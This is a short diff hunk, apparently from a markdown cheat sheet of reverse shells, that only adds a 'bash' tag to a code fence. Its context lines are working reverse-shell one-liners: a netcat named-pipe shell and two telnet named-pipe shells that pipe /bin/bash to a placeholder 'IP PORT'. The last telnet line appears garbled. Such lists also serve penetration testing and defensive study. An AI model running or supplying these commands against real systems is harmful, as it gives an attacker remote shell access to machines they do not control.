@@ -33,7 +33,7 @@ rm -f backpipe; mknod /tmp/backpipe p && nc IP PORT 0<backpipe | /bin/bash 1>bac
 
 ## Telnet
 
-```
+```bash
 mknod a p;telnet IP PORT 0<a | /bin/bash 1>a
 rm -f /tmp/p; mknod /tmp/p p && telnet IP PORT 0/tmp/p
 ```
